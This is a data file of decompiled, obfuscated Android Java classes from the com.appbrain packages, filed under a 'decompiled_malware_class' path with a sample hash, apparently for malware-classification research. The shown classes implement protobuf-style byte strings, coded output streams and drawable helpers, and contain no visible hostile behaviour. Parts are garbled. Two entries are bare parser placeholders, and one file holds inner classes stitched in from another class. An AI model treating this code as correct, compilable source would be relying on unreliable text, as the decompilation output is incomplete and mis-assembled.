"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\b.code","public abstract class b implements o {   private static final f a=f.a();   private m a(  byte[] bArr,  int i,  f fVar){     try {       try {         d a2=d.a(bArr,i);         m mVar=(m)a(a2,fVar);         try {           a2.a(0);           return mVar;         }  catch (        i e) {           throw e.a(mVar);         }       }  catch (      IOException e2) {         throw new RuntimeException(""Reading from a byte array threw an IOException (should never happen)."",e2);       }     }  catch (    i e3) {       throw e3;     }   }   @Override public final Object a(  byte[] bArr){     m a2=a(bArr,bArr.length,a);     if (a2 == null || a2.e()) {       return a2;     }     throw (a2 instanceof a ? new q() : new q()).a().a(a2);   } } static final class b {   private final e a;   private final byte[] b;   private b(  int i){     this.b=new byte[i];     this.a=e.a(this.b);   }   b(  int i,  byte b){     this(i);   }   public final c a(){     this.a.b();     return new l(this.b);   }   public final e b(){     return this.a;   } } public class b implements c.a {   int a;   private final a c;   private c.a d;   private b(){     this.c=new a(p.this,(byte)0);     this.d=this.c.next().iterator();     this.a=p.this.b();   }   b(  p pVar,  byte b){     this();   }   @Override public final byte a(){     if (!this.d.hasNext()) {       this.d=this.c.next().iterator();     }     this.a--;     return this.d.a();   }   @Override public final boolean hasNext(){     return this.a > 0;   }   @Override public final Object next(){     return Byte.valueOf(a());   }   @Override public final void remove(){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\c.code","public abstract class c implements Iterable {   public static final c a;   static final boolean b; public interface a extends Iterator {     byte a();   } static final class b {     private final e a;     private final byte[] b;     private b(    int i){       this.b=new byte[i];       this.a=e.a(this.b);     }     b(    int i,    byte b){       this(i);     }     public final c a(){       this.a.b();       return new l(this.b);     }     public final e b(){       return this.a;     }   } static {     b=!c.class.desiredAssertionStatus();     a=new l(new byte[0]);   }   public static b a(  int i){     return new b(i,(byte)0);   }   public static c a(  String str){     try {       return new l(str.getBytes(""UTF-8""));     }  catch (    UnsupportedEncodingException e) {       throw new RuntimeException(""UTF-8 not supported?"",e);     }   }   public static c a(  byte[] bArr){     return a(bArr,0,bArr.length);   }   public static c a(  byte[] bArr,  int i,  int i2){     byte[] bArr2=new byte[i2];     System.arraycopy(bArr,i,bArr2,0,i2);     return new l(bArr2);   }   public abstract int a(  int i,  int i2,  int i3);   @Override public abstract a iterator();   public final void a(  byte[] bArr,  int i,  int i2,  int i3){     if (i < 0) {       throw new IndexOutOfBoundsException(""Source offset < 0: "" + i);     }     if (i2 < 0) {       throw new IndexOutOfBoundsException(""Target offset < 0: "" + i2);     }     if (i3 < 0) {       throw new IndexOutOfBoundsException(""Length < 0: "" + i3);     }     if (i + i3 > b()) {       throw new IndexOutOfBoundsException(""Source end offset < 0: "" + (i + i3));     }     if (i2 + i3 > bArr.length) {       throw new IndexOutOfBoundsException(""Target end offset < 0: "" + (i2 + i3));     }     if (i3 > 0) {       b(bArr,i,i2,i3);     }   }   public abstract int b();   public abstract int b(  int i,  int i2,  int i3);   public abstract String b(  String str);   public abstract void b(  byte[] bArr,  int i,  int i2,  int i3);   public final boolean c(){     return b() == 0;   }   public final byte[] d(){     int b2=b();     byte[] bArr=new byte[b2];     b(bArr,0,0,b2);     return bArr;   }   public final String e(){     try {       return b(""UTF-8"");     }  catch (    UnsupportedEncodingException e) {       throw new RuntimeException(""UTF-8 not supported?"",e);     }   }   public abstract boolean f();   public abstract InputStream g();   public abstract int h();   public String toString(){     return String.format(""<ByteString@%s size=%d>"",Integer.toHexString(System.identityHashCode(this)),Integer.valueOf(b()));   } } private class c extends InputStream {   private a b;   private l c;   private int d;   private int e;   private int f;   private int g;   public c(){     a();   }   private int a(  byte[] bArr,  int i,  int i2){     int i3=i2;     int i4=i;     while (true) {       if (i3 <= 0) {         break;       }       b();       if (this.c != null) {         int min=Math.min(this.d - this.e,i3);         if (bArr != null) {           this.c.a(bArr,this.e,i4,min);           i4+=min;         }         this.e+=min;         i3-=min;       }  else       if (i3 == i2) {         return -1;       }     }     return i2 - i3;   }   private void a(){     this.b=new a(p.this,(byte)0);     this.c=this.b.next();     this.d=this.c.b();     this.e=0;     this.f=0;   }   private void b(){     if (this.c == null || this.e != this.d) {       return;     }     this.f+=this.d;     this.e=0;     if (this.b.hasNext()) {       this.c=this.b.next();       this.d=this.c.b();     }  else {       this.c=null;       this.d=0;     }   }   @Override public final int available(){     return p.this.b() - (this.f + this.e);   }   @Override public final void mark(  int i){     this.g=this.f + this.e;   }   @Override public final boolean markSupported(){     return true;   }   @Override public final int read(){     b();     if (this.c == null) {       return -1;     }     l lVar=this.c;     int i=this.e;     this.e=i + 1;     return lVar.b(i) & 255;   }   @Override public final int read(  byte[] bArr,  int i,  int i2){     if (bArr == null) {       throw new NullPointerException();     }     if (i < 0 || i2 < 0 || i2 > bArr.length - i) {       throw new IndexOutOfBoundsException();     }     return a(bArr,i,i2);   }   @Override public final synchronized void reset(){     a();     a(null,0,this.g);   }   @Override public final long skip(  long j){     if (j < 0) {       throw new IndexOutOfBoundsException();     }     if (j > 2147483647L) {       j=2147483647L;     }     return a(null,0,(int)j);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\d.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2fff837f"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\e.code","public final class e {   private final byte[] a;   private final int b;   private int c;   private final OutputStream d; public static class a extends IOException {     a(){       super(""CodedOutputStream was writing to a flat byte array and ran out of space."");     }   }   private e(  OutputStream outputStream,  byte[] bArr){     this.d=outputStream;     this.a=bArr;     this.c=0;     this.b=bArr.length;   }   private e(  byte[] bArr,  int i){     this.d=null;     this.a=bArr;     this.c=0;     this.b=i + 0;   }   public static int a(  int i){     return g(i) + 1;   }   public static int a(  c cVar){     return h(cVar.b()) + cVar.b();   }   public static e a(  OutputStream outputStream){     return new e(outputStream,new byte[4096]);   }   public static e a(  byte[] bArr){     return new e(bArr,bArr.length);   }   private void a(  long j){     while (((-128) & j) != 0) {       f((((int)j) & 127) | android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);       j>>>=7;     }     f((int)j);   }   public static int b(  int i){     if (i >= 0) {       return h(i);     }     return 10;   }   public static int b(  int i,  long j){     return (((-128) & j) == 0 ? 1 : ((-16384) & j) == 0 ? 2 : ((-2097152) & j) == 0 ? 3 : ((-268435456) & j) == 0 ? 4 : ((-34359738368L) & j) == 0 ? 5 : ((-4398046511104L) & j) == 0 ? 6 : ((-562949953421312L) & j) == 0 ? 7 : ((-72057594037927936L) & j) == 0 ? 8 : (Long.MIN_VALUE & j) == 0 ? 9 : 10) + g(i);   }   public static int b(  int i,  c cVar){     return g(i) + a(cVar);   }   public static int b(  int i,  m mVar){     int g=g(i);     int c=mVar.c();     return g + c + h(c);   }   public static int c(  int i,  int i2){     return g(i) + b(i2);   }   private void c(){     if (this.d == null) {       throw new a();     }     this.d.write(this.a,0,this.c);     this.c=0;   }   public static int d(  int i,  int i2){     return g(i) + b(i2);   }   private void e(  int i){     if (i >= 0) {       c(i);     }  else {       a(i);     }   }   private void e(  int i,  int i2){     c(v.a(i,i2));   }   private void f(  int i){     byte b=(byte)i;     if (this.c == this.b) {       c();     }     byte[] bArr=this.a;     int i2=this.c;     this.c=i2 + 1;     bArr[i2]=b;   }   private static int g(  int i){     return h(v.a(i,0));   }   private static int h(  int i){     if ((i & (-128)) == 0) {       return 1;     }     if ((i & (-16384)) == 0) {       return 2;     }     if (((-2097152) & i) == 0) {       return 3;     }     return ((-268435456) & i) == 0 ? 4 : 5;   }   public final void a(){     if (this.d != null) {       c();     }   }   public final void a(  int i,  int i2){     e(i,0);     e(i2);   }   public final void a(  int i,  long j){     e(i,0);     a(j);   }   public final void a(  int i,  c cVar){     e(i,2);     c(cVar.b());     int b=cVar.b();     if (this.b - this.c >= b) {       cVar.a(this.a,0,this.c,b);       this.c=b + this.c;       return;     }     int i2=this.b - this.c;     cVar.a(this.a,0,this.c,i2);     int i3=i2 + 0;     int i4=b - i2;     this.c=this.b;     c();     if (i4 <= this.b) {       cVar.a(this.a,i3,0,i4);       this.c=i4;       return;     }     InputStream g=cVar.g();     if (i3 != g.skip(i3)) {       throw new IllegalStateException(""Skip failed? Should never happen."");     }     while (i4 > 0) {       int min=Math.min(i4,this.b);       int read=g.read(this.a,0,min);       if (read != min) {         throw new IllegalStateException(""Read failed? Should never happen"");       }       this.d.write(this.a,0,read);       i4-=read;     }   }   public final void a(  int i,  m mVar){     e(i,2);     c(mVar.c());     mVar.a(this);   }   public final void a(  int i,  boolean z){     e(i,0);     f(z ? 1 : 0);   }   public final void b(){     if (this.d != null) {       throw new UnsupportedOperationException(""spaceLeft() can only be called on CodedOutputStreams that are writing to a flat array."");     }     if (this.b - this.c != 0) {       throw new IllegalStateException(""Did not write as much data as expected."");     }   }   public final void b(  int i,  int i2){     e(i,0);     e(i2);   }   public final void c(  int i){     while ((i & (-128)) != 0) {       f((i & 127) | android.support.v4.view.a.a.ACTION_CLEAR_ACCESSIBILITY_FOCUS);       i>>>=7;     }     f(i);   }   public final void d(  int i){     f(i & 255);     f((i >> 8) & 255);     f((i >> 16) & 255);     f((i >> 24) & 255);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\f.code","public final class f {   private static volatile boolean a=false;   private static final f c=new f((byte)0);   private final Map b;   f(){     this.b=new HashMap();   }   private f(  byte b){     this.b=Collections.emptyMap();   }   public static f a(){     return c;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\g.code","public abstract class g extends com.appbrain.b.a implements Serializable { public static abstract class a extends a.AbstractC0008a {     @Override public a clone(){       throw new UnsupportedOperationException(""This is supposed to be overridden by subclasses."");     }   }   public g(){   }   public g(  byte b){   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\h.code","public final class h { public interface a {   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\i.code","public final class i extends IOException {   private m a;   public i(  String str){     super(str);     this.a=null;   }   public static i a(){     return new i(""While parsing a protocol message, the input ended unexpectedly in the middle of a field.  This could mean either than the input has been truncated or that an embedded message misreported its own length."");   }   public static i b(){     return new i(""CodedInputStream encountered an embedded string or message which claimed to have negative size."");   }   public static i c(){     return new i(""CodedInputStream encountered a malformed varint."");   }   public static i d(){     return new i(""Protocol message contained an invalid tag (zero)."");   }   public static i e(){     return new i(""Protocol message end-group tag did not match expected tag."");   }   public static i f(){     return new i(""Protocol message tag had invalid wire type."");   }   public static i g(){     return new i(""Protocol message had too many levels of nesting.  May be malicious.  Use CodedInputStream.setRecursionLimit() to increase the depth limit."");   }   public static i h(){     return new i(""Protocol message was too large.  May be malicious.  Use CodedInputStream.setSizeLimit() to increase the size limit."");   }   public final i a(  m mVar){     this.a=mVar;     return this;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\j.code","public final class j extends AbstractList implements k, RandomAccess {   public static final k a=new r(new j());   private final List b;   public j(){     this.b=new ArrayList();   }   public j(  k kVar){     this.b=new ArrayList(kVar.size());     addAll(kVar);   }   private static String a(  Object obj){     return obj instanceof String ? (String)obj : ((c)obj).e();   }   @Override public final c a(  int i){     Object obj=this.b.get(i);     if (!(obj instanceof String)) {       return (c)obj;     }     c a2=c.a((String)obj);     this.b.set(i,a2);     return a2;   }   @Override public final List a(){     return Collections.unmodifiableList(this.b);   }   @Override public final void a(  c cVar){     this.b.add(cVar);     this.modCount++;   }   @Override public final void add(  int i,  Object obj){     this.b.add(i,(String)obj);     this.modCount++;   }   @Override public final boolean addAll(  int i,  Collection collection){     if (collection instanceof k) {       collection=((k)collection).a();     }     boolean addAll=this.b.addAll(i,collection);     this.modCount++;     return addAll;   }   @Override public final boolean addAll(  Collection collection){     return addAll(size(),collection);   }   @Override public final void clear(){     this.b.clear();     this.modCount++;   }   @Override public final Object get(  int i){     Object obj=this.b.get(i);     if (obj instanceof String) {       return (String)obj;     }     c cVar=(c)obj;     String e=cVar.e();     if (cVar.f()) {       this.b.set(i,e);     }     return e;   }   @Override public final Object remove(  int i){     Object remove=this.b.remove(i);     this.modCount++;     return a(remove);   }   @Override public final Object set(  int i,  Object obj){     return a(this.b.set(i,(String)obj));   }   @Override public final int size(){     return this.b.size();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\k.code","public interface k extends List {   c a(  int i);   List a();   void a(  c cVar); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\l.code","public final class l extends c {   protected final byte[] c;   private int d=0; public class a implements c.a {     private int b;     private final int c;     private a(){       this.b=0;       this.c=l.this.b();     }     a(    l lVar,    byte b){       this();     }     @Override public final byte a(){       try {         byte[] bArr=l.this.c;         int i=this.b;         this.b=i + 1;         return bArr[i];       }  catch (      ArrayIndexOutOfBoundsException e) {         throw new NoSuchElementException(e.getMessage());       }     }     @Override public final boolean hasNext(){       return this.b < this.c;     }     @Override public final Object next(){       return Byte.valueOf(a());     }     @Override public final void remove(){       throw new UnsupportedOperationException();     }   }   public l(  byte[] bArr){     this.c=bArr;   }   @Override protected final int a(  int i,  int i2,  int i3){     int i4=i2 + 0;     return u.a(i,this.c,i4,i4 + i3);   }   @Override public final c.a iterator(){     return new a(this,(byte)0);   }   public final boolean a(  l lVar,  int i,  int i2){     if (i2 > lVar.c.length) {       throw new IllegalArgumentException(""Length too large: "" + i2 + this.c.length);     }     if (i + i2 > lVar.c.length) {       throw new IllegalArgumentException(""Ran off end of other: "" + i + "", ""+ i2+ "", ""+ lVar.c.length);     }     byte[] bArr=this.c;     byte[] bArr2=lVar.c;     int i3=i2 + 0;     int i4=i + 0;     int i5=0;     while (i5 < i3) {       if (bArr[i5] != bArr2[i4]) {         return false;       }       i5++;       i4++;     }     return true;   }   public final byte b(  int i){     return this.c[i];   }   @Override public final int b(){     return this.c.length;   }   @Override protected final int b(  int i,  int i2,  int i3){     byte[] bArr=this.c;     int i4=i2 + 0;     int i5=i4 + i3;     while (i4 < i5) {       i=(i * 31) + bArr[i4];       i4++;     }     return i;   }   @Override public final String b(  String str){     return new String(this.c,0,this.c.length,str);   }   @Override protected final void b(  byte[] bArr,  int i,  int i2,  int i3){     System.arraycopy(this.c,i,bArr,i2,i3);   }   public final boolean equals(  Object obj){     if (obj == this) {       return true;     }     if ((obj instanceof c) && this.c.length == ((c)obj).b()) {       if (this.c.length == 0) {         return true;       }       if (obj instanceof l) {         return a((l)obj,0,this.c.length);       }       if (obj instanceof p) {         return obj.equals(this);       }       throw new IllegalArgumentException(""Has a new type of ByteString been created? Found "" + obj.getClass());     }     return false;   }   @Override public final boolean f(){     return u.a(this.c,0,this.c.length + 0) == 0;   }   @Override public final InputStream g(){     return new ByteArrayInputStream(this.c,0,this.c.length);   }   @Override protected final int h(){     return this.d;   }   public final int hashCode(){     int i=this.d;     if (i == 0) {       int length=this.c.length;       i=b(length,0,length);       if (i == 0) {         i=1;       }       this.d=i;     }     return i;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\m.code","public interface m extends n { public interface a extends n, Cloneable {     m c();   }   c a();   void a(  e eVar);   byte[] b();   int c();   a d(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\n.code","public interface n {   boolean e(); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\o.code","public interface o {   Object a(  d dVar,  f fVar);   Object a(  byte[] bArr); } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\p.code","public final class p extends com.appbrain.b.c {   private static final int[] c;   private final int d;   private final com.appbrain.b.c e;   private final com.appbrain.b.c f;   private final int g;   private int h; public static class a implements Iterator {     private final Stack a;     private l b;     private a(    com.appbrain.b.c cVar){       this.a=new Stack();       this.b=a(cVar);     }     a(    com.appbrain.b.c cVar,    byte b){       this(cVar);     }     private l a(    com.appbrain.b.c cVar){       com.appbrain.b.c cVar2=cVar;       while (cVar2 instanceof p) {         p pVar=(p)cVar2;         this.a.push(pVar);         cVar2=pVar.e;       }       return (l)cVar2;     }     private l b(){       while (!this.a.isEmpty()) {         l a=a(((p)this.a.pop()).f);         if (!a.c()) {           return a;         }       }       return null;     }     @Override public final l next(){       if (this.b == null) {         throw new NoSuchElementException();       }       l lVar=this.b;       this.b=b();       return lVar;     }     @Override public final boolean hasNext(){       return this.b != null;     }     @Override public final void remove(){       throw new UnsupportedOperationException();     }   } public class b implements c.a {     int a;     private final a c;     private c.a d;     private b(){       this.c=new a(p.this,(byte)0);       this.d=this.c.next().iterator();       this.a=p.this.b();     }     b(    p pVar,    byte b){       this();     }     @Override public final byte a(){       if (!this.d.hasNext()) {         this.d=this.c.next().iterator();       }       this.a--;       return this.d.a();     }     @Override public final boolean hasNext(){       return this.a > 0;     }     @Override public final Object next(){       return Byte.valueOf(a());     }     @Override public final void remove(){       throw new UnsupportedOperationException();     }   } private class c extends InputStream {     private a b;     private l c;     private int d;     private int e;     private int f;     private int g;     public c(){       a();     }     private int a(    byte[] bArr,    int i,    int i2){       int i3=i2;       int i4=i;       while (true) {         if (i3 <= 0) {           break;         }         b();         if (this.c != null) {           int min=Math.min(this.d - this.e,i3);           if (bArr != null) {             this.c.a(bArr,this.e,i4,min);             i4+=min;           }           this.e+=min;           i3-=min;         }  else         if (i3 == i2) {           return -1;         }       }       return i2 - i3;     }     private void a(){       this.b=new a(p.this,(byte)0);       this.c=this.b.next();       this.d=this.c.b();       this.e=0;       this.f=0;     }     private void b(){       if (this.c == null || this.e != this.d) {         return;       }       this.f+=this.d;       this.e=0;       if (this.b.hasNext()) {         this.c=this.b.next();         this.d=this.c.b();       }  else {         this.c=null;         this.d=0;       }     }     @Override public final int available(){       return p.this.b() - (this.f + this.e);     }     @Override public final void mark(    int i){       this.g=this.f + this.e;     }     @Override public final boolean markSupported(){       return true;     }     @Override public final int read(){       b();       if (this.c == null) {         return -1;       }       l lVar=this.c;       int i=this.e;       this.e=i + 1;       return lVar.b(i) & 255;     }     @Override public final int read(    byte[] bArr,    int i,    int i2){       if (bArr == null) {         throw new NullPointerException();       }       if (i < 0 || i2 < 0 || i2 > bArr.length - i) {         throw new IndexOutOfBoundsException();       }       return a(bArr,i,i2);     }     @Override public final synchronized void reset(){       a();       a(null,0,this.g);     }     @Override public final long skip(    long j){       if (j < 0) {         throw new IndexOutOfBoundsException();       }       if (j > 2147483647L) {         j=2147483647L;       }       return a(null,0,(int)j);     }   } static {     int i=1;     ArrayList arrayList=new ArrayList();     int i2=1;     while (i > 0) {       arrayList.add(Integer.valueOf(i));       int i3=i2 + i;       i2=i;       i=i3;     }     arrayList.add(Integer.MAX_VALUE);     c=new int[arrayList.size()];     int i4=0;     while (true) {       int i5=i4;       if (i5 >= c.length) {         return;       }       c[i5]=((Integer)arrayList.get(i5)).intValue();       i4=i5 + 1;     }   }   @Override public final int a(  int i,  int i2,  int i3){     if (i2 + i3 <= this.g) {       return this.e.a(i,i2,i3);     }     if (i2 >= this.g) {       return this.f.a(i,i2 - this.g,i3);     }     int i4=this.g - i2;     return this.f.a(this.e.a(i,i2,i4),0,i3 - i4);   }   @Override public final c.a iterator(){     return new b(this,(byte)0);   }   @Override public final int b(){     return this.d;   }   @Override public final int b(  int i,  int i2,  int i3){     if (i2 + i3 <= this.g) {       return this.e.b(i,i2,i3);     }     if (i2 >= this.g) {       return this.f.b(i,i2 - this.g,i3);     }     int i4=this.g - i2;     return this.f.b(this.e.b(i,i2,i4),0,i3 - i4);   }   @Override public final String b(  String str){     return new String(d(),str);   }   @Override public final void b(  byte[] bArr,  int i,  int i2,  int i3){     if (i + i3 <= this.g) {       this.e.b(bArr,i,i2,i3);     }  else {       if (i >= this.g) {         this.f.b(bArr,i - this.g,i2,i3);         return;       }       int i4=this.g - i;       this.e.b(bArr,i,i2,i4);       this.f.b(bArr,0,i2 + i4,i3 - i4);     }   }   public final boolean equals(  Object obj){     int h;     byte b2=0;     if (obj == this) {       return true;     }     if (!(obj instanceof com.appbrain.b.c)) {       return false;     }     com.appbrain.b.c cVar=(com.appbrain.b.c)obj;     if (this.d != cVar.b()) {       return false;     }     if (this.d == 0) {       return true;     }     if (this.h != 0 && (h=cVar.h()) != 0 && this.h != h) {       return false;     }     a aVar=new a(this,b2);     l lVar=(l)aVar.next();     a aVar2=new a(cVar,b2);     l lVar2=(l)aVar2.next();     int i=0;     l lVar3=lVar;     int i2=0;     int i3=0;     while (true) {       int b3=lVar3.b() - i2;       int b4=lVar2.b() - i;       int min=Math.min(b3,b4);       if (!(i2 == 0 ? lVar3.a(lVar2,i,min) : lVar2.a(lVar3,i2,min))) {         return false;       }       int i4=i3 + min;       if (i4 >= this.d) {         if (i4 == this.d) {           return true;         }         throw new IllegalStateException();       }       if (min == b3) {         lVar3=(l)aVar.next();         i2=0;       }  else {         i2+=min;       }       if (min == b4) {         lVar2=(l)aVar2.next();         i=0;         i3=i4;       }  else {         i+=min;         i3=i4;       }     }   }   @Override public final boolean f(){     return this.f.a(this.e.a(0,0,this.g),0,this.f.b()) == 0;   }   @Override public final InputStream g(){     return new c();   }   @Override public final int h(){     return this.h;   }   public final int hashCode(){     int i=this.h;     if (i == 0) {       i=b(this.d,0,this.d);       if (i == 0) {         i=1;       }       this.h=i;     }     return i;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\q.code","public final class q extends RuntimeException {   private final List a;   public q(){     super(""Message was missing required fields.  (Lite runtime could not determine which fields were missing)."");     this.a=null;   }   public final i a(){     return new i(getMessage());   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\r.code","public final class r extends AbstractList implements k, RandomAccess {   private final k a;   public r(  k kVar){     this.a=kVar;   }   @Override public final c a(  int i){     return this.a.a(i);   }   @Override public final List a(){     return this.a.a();   }   @Override public final void a(  c cVar){     throw new UnsupportedOperationException();   }   @Override public final Object get(  int i){     return (String)this.a.get(i);   }   @Override public final Iterator iterator(){     return new t(this);   }   @Override public final ListIterator listIterator(  int i){     return new s(this,i);   }   @Override public final int size(){     return this.a.size();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\s.code","final class s implements ListIterator {   ListIterator a;   final int b;   final r c;   public s(  r rVar,  int i){     k kVar;     this.c=rVar;     this.b=i;     kVar=this.c.a;     this.a=kVar.listIterator(this.b);   }   @Override public final void add(  Object obj){     throw new UnsupportedOperationException();   }   @Override public final boolean hasNext(){     return this.a.hasNext();   }   @Override public final boolean hasPrevious(){     return this.a.hasPrevious();   }   @Override public final Object next(){     return (String)this.a.next();   }   @Override public final int nextIndex(){     return this.a.nextIndex();   }   @Override public final Object previous(){     return (String)this.a.previous();   }   @Override public final int previousIndex(){     return this.a.previousIndex();   }   @Override public final void remove(){     throw new UnsupportedOperationException();   }   @Override public final void set(  Object obj){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\t.code","final class t implements Iterator {   Iterator a;   final r b;   public t(  r rVar){     k kVar;     this.b=rVar;     kVar=this.b.a;     this.a=kVar.iterator();   }   @Override public final boolean hasNext(){     return this.a.hasNext();   }   @Override public final Object next(){     return (String)this.a.next();   }   @Override public final void remove(){     throw new UnsupportedOperationException();   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\u.code","!org.eclipse.jdt.core.dom.TypeDeclaration@2d5f523a"
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.b\v.code","public final class v {   static final int a=11;   static final int b=12;   static final int c=16;   static final int d=26;   public static int a(  int i){     return i & 7;   }   public static int a(  int i,  int i2){     return (i << 3) | i2;   }   public static int b(  int i){     return i >>> 3;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.c\a.code","public final class a extends Exception {   public a(  String str){     super(str);   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\a.code","public final class a extends PaintDrawable {   private Paint b=new Paint(1);   Drawable.ConstantState a=new b(this);   public a(  Shape shape){     setShape(shape);     this.b.setStyle(Paint.Style.STROKE);   }   public static a a(  Context context,  float f,  int i){     float f2=context.getResources().getDisplayMetrics().density;     a aVar=new a(new RectShape());     aVar.setCornerRadius(f * f2);     if (i != 0) {       aVar.b.setStrokeWidth(f2 * 2.0f);       aVar.b.setColor(i);     }  else {       aVar.b.setStrokeWidth(0.0f);     }     return aVar;   }   public final Paint a(){     return this.b;   }   @Override public final Drawable.ConstantState getConstantState(){     return this.a;   }   @Override protected final void onDraw(  Shape shape,  Canvas canvas,  Paint paint){     shape.draw(canvas,paint);     if (this.b.getStrokeWidth() > 0.0f) {       shape.draw(canvas,this.b);     }   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\b.code","public final class b extends Drawable.ConstantState {   final a a;   public b(  a aVar){     this.a=aVar;   }   @Override public final int getChangingConfigurations(){     return 0;   }   @Override public final Drawable newDrawable(){     return this.a;   } } "
"msc_data/decompiled_malware_class/0013121BFDC7CC7E21401F95144EF56AF783F20477748E488725A1CFF68BB2B7\com.appbrain.d\c.code","public class c extends LayerDrawable {   private int a;   private float[] b;   private ColorFilter c;   private ColorFilter d;   private ColorFilter e;   private ColorFilter f;   public c(  Drawable[] drawableArr,  float[] fArr){     super(drawableArr);     this.a=-1;     this.b=fArr;     a();   }   private static Drawable a(  Drawable drawable,  Context context){     return drawable instanceof GradientDrawable ? new e(drawable.getConstantState().newDrawable(context.getResources())) : f.a(drawable,context.getResources());   }   public static c a(  Context context,  Drawable drawable){     return b(context,drawable);   }   public static c a(  Context context,  Drawable drawable,  Drawable drawable2){     return new d(new Drawable[]{a(drawable,context)},b(),drawable2);   }   private void a(){     float[] fArr=new float[this.b.length];     System.arraycopy(this.b,0,fArr,0,fArr.length);     for (int i=0; i < 3; i++) {       fArr[i * 5]=(float)(fArr[r3] * 1.25d);       fArr[(i * 5) + 1]=(float)(fArr[r3] * 1.25d);       fArr[(i * 5) + 2]=(float)(fArr[r3] * 1.25d);     }     this.d=new ColorMatrixColorFilter(fArr);     System.arraycopy(this.b,0,fArr,0,fArr.length);     for (int i2=0; i2 < 3; i2++) {       fArr[i2 * 5]=(float)(fArr[r3] * 0.8d);       fArr[(i2 * 5) + 1]=(float)(fArr[r3] * 0.8d);       fArr[(i2 * 5) + 2]=(float)(fArr[r3] * 0.8d);     }     this.e=new ColorMatrixColorFilter(fArr);     System.arraycopy(this.b,0,fArr,0,fArr.length);     for (int i3=0; i3 < 3; i3++) {       float f=((this.b[i3] + this.b[i3 + 5]) + this.b[i3 + 10]) / 3.0f;       fArr[i3]=((fArr[i3] - f) / 2.0f) + f;       fArr[i3 + 5]=((fArr[i3 + 5] - f) / 2.0f) + f;       fArr[i3 + 10]=f + ((fArr[i3 + 10] - f) / 2.0f);     }     this.f=new ColorMatrixColorFilter(fArr);     this.c=new ColorMatrixColorFilter(this.b);     a(getState());   }   private void a(  int[] iArr){     ColorFilter colorFilter=this.c;     boolean z=false;     for (    int i : iArr) {       if (i == 16842910) {         z=true;       }       if (i == 16842919) {         colorFilter=this.e;       }       if (i == 16842908 || i == 16842913) {         colorFilter=this.d;       }     }     if (!z) {       colorFilter=this.f;     }     (this.a != -1 ? getDrawable(this.a) : this).setColorFilter(colorFilter);     invalidateSelf();   }   public static c b(  Context context,  Drawable drawable){     return new c(new Drawable[]{a(drawable,context)},b());   }   private static float[] b(){     float[] fArr=new float[20];     fArr[18]=1.0f;     int blue=Color.blue(-1);     int red=Color.red(-1);     int green=Color.green(-1);     fArr[0]=red / 255.0f;     fArr[6]=green / 255.0f;     fArr[12]=blue / 255.0f;     return fArr;   }   @Override public boolean isStateful(){     return true;   }   @Override protected boolean onStateChange(  int[] iArr){     a(iArr);     return super.onStateChange(iArr);   } } "
